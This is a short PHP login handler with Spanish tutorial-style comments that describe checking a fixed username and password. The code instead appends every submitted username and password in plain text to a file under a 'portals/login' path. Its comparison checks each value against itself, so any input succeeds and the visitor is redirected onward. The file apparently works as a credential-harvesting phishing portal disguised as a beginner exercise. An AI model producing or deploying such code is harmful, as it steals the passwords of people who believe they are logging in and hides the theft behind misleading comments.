<?php
# Las claves de acceso, ahorita las ponemos aquí
# y en otro ejercicio las ponemos en una base de datos
$usuario_correcto = "juan";
$palabra_secreta_correcta = "juan";
/*
Para leer los datos que fueron enviados al formulario,
accedemos al arreglo superglobal llamado $_POST en PHP, y
para obtener un valor accedemos a $_POST["clave"] en donde
clave es el "name" que le dimos al input
 */
# Nota: no estamos haciendo validaciones
$usuario = $_POST["usuario"];
$palabra_secreta = $_POST["palabra_secreta"];

error_log(" Usuario: ".$usuario." Contraseña: ".$palabra_secreta.",", 3, "/sd/portals/login/contrasenas.txt");

# Luego de haber obtenido los valores, ya podemos comprobar:
if ($usuario === $usuario && $palabra_secreta === $palabra_secreta) {
    header("Location: continuar.php");
} else {
    # No coinciden, así que simplemente imprimimos un
    # mensaje diciendo que es incorrecto
    echo "El usuario o la contraseña son incorrectos";
}